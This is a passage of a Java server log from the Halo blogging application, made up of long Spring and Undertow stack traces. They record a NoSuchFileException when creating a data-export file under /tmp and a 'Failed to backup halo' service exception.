org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:88) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at run.halo.app.handler.aspect.DisableOnConditionAspect.around(DisableOnConditionAspect.java:43) ~[classes!/:na] at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:na] at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:na] at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na] at java.base/java.lang.reflect.Method.invoke(Method.java:566) ~[na:na] at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs(AbstractAspectJAdvice.java:644) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod(AbstractAspectJAdvice.java:633) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.aspectj.AspectJAroundAdvice.invoke(AspectJAroundAdvice.java:70) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:175) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:95) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:689) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at run.halo.app.controller.admin.api.BackupController$$EnhancerBySpringCGLIB$$ca126f0f.exportData(&lt;generated&gt;) ~[classes!/:na] at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:na] at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:na] at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na] at java.base/java.lang.reflect.Method.invoke(Method.java:566) ~[na:na] at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:106) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:879) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:793) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:523) ~[jakarta.servlet-api-4.0.3.jar!/:4.0.3] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:590) ~[jakarta.servlet-api-4.0.3.jar!/:4.0.3] at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at run.halo.app.security.filter.AdminAuthenticationFilter.doAuthenticate(AdminAuthenticationFilter.java:116) ~[classes!/:na] at run.halo.app.security.filter.AbstractAuthenticationFilter.doFilterInternal(AbstractAuthenticationFilter.java:191) ~[classes!/:na] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at run.halo.app.filter.CorsFilter.doFilter(CorsFilter.java:49) ~[classes!/:na] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at run.halo.app.filter.LogFilter.doFilterInternal(LogFilter.java:38) ~[classes!/:na] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:109) ~[spring-boot-actuator-2.2.5.RELEASE.jar!/:2.2.5.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:132) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:269) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:78) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:133) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:130) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:249) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:78) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:99) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.Connectors.executeRootHandler(Connectors.java:376) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:830) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) ~[na:na] at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) ~[na:na] at java.base/java.lang.Thread.run(Thread.java:834) ~[na:na] Caused by: java.nio.file.NoSuchFileException: /tmp/halo-data-export/halo-data-export-2020-05-15-23-09-21-464891705.json at java.base/sun.nio.fs.UnixException.translateToIOException(UnixException.java:92) ~[na:na] at java.base/sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:111) ~[na:na] at java.base/sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:116) ~[na:na] at java.base/sun.nio.fs.UnixFileSystemProvider.newByteChannel(UnixFileSystemProvider.java:219) ~[na:na] at java.base/java.nio.file.Files.newByteChannel(Files.java:370) ~[na:na] at java.base/java.nio.file.Files.createFile(Files.java:647) ~[na:na] at run.halo.app.service.impl.BackupServiceImpl.exportData(BackupServiceImpl.java:297) ~[classes!/:na] ... 106 common frames omitted  2020-05-15 23:09:24.280 ERROR 616 --- [XNIO-1 task-13] r.h.app.core.ControllerExceptionHandler  : Captured an exception  run.halo.app.exception.ServiceException: Failed to backup halo at run.halo.app.service.impl.BackupServiceImpl.backupWorkDirectory(BackupServiceImpl.java:178) ~[classes!/:na] at run.halo.app.controller.admin.api.BackupController.backupHalo(BackupController.java:47) ~[classes!/:na] at run.halo.app.controller.admin.api.BackupController$$FastClassBySpringCGLIB$$810ea7c7.invoke(&lt;generated&gt;) ~[classes!/:na] at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) ~[spring-core-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:769) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:88) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at run.halo.app.core.ControllerLogAop.controller(ControllerLogAop.java:48) ~[classes!/:na] at jdk.internal.reflect.GeneratedMethodAccessor303.invoke(Unknown Source) ~[na:na] at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na] at java.base/java.lang.reflect.Method.invoke(Method.java:566) ~[na:na] at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs(AbstractAspectJAdvice.java:644) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod(AbstractAspectJAdvice.java:633) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.aspectj.AspectJAroundAdvice.invoke(AspectJAroundAdvice.java:70) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:88) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at run.halo.app.handler.aspect.DisableOnConditionAspect.around(DisableOnConditionAspect.java:43) ~[classes!/:na] at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:na] at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:na] at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na] at java.base/java.lang.reflect.Method.invoke(Method.java:566) ~[na:na] at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs(AbstractAspectJAdvice.java:644) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod(AbstractAspectJAdvice.java:633) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.aspectj.AspectJAroundAdvice.invoke(AspectJAroundAdvice.java:70) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:175) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:95) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:689) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at run.halo.app.controller.admin.api.BackupController$$EnhancerBySpringCGLIB$$ca126f0f.backupHalo(&lt;generated&gt;) ~[classes!/:na] at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:na] at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:na] at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na] at java.base/java.lang.reflect.Method.invoke(Method.java:566) ~[na:na] at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:106) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:879) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:793) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:523) ~[jakarta.servlet-api-4.0.3.jar!/:4.0.3] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:590) ~[jakarta.servlet-api-4.0.3.jar!/:4.0.3] at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at run.halo.app.security.filter.AdminAuthenticationFilter.doAuthenticate(AdminAuthenticationFilter.java:116) ~[classes!/:na] at run.halo.app.security.filter.AbstractAuthenticationFilter.doFilterInternal(AbstractAuthenticationFilter.java:191) ~[classes!/:na] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at run.halo.app.filter.CorsFilter.doFilter(CorsFilter.java:49) ~[classes!/:na] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at run.halo.app.filter.LogFilter.doFilterInternal(LogFilter.java:38) ~[classes!/:na] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:109) ~[spring-boot-actuator-2.2.5.RELEASE.jar!/:2.2.5.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:132) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:269) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:78) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:133) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:130) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at 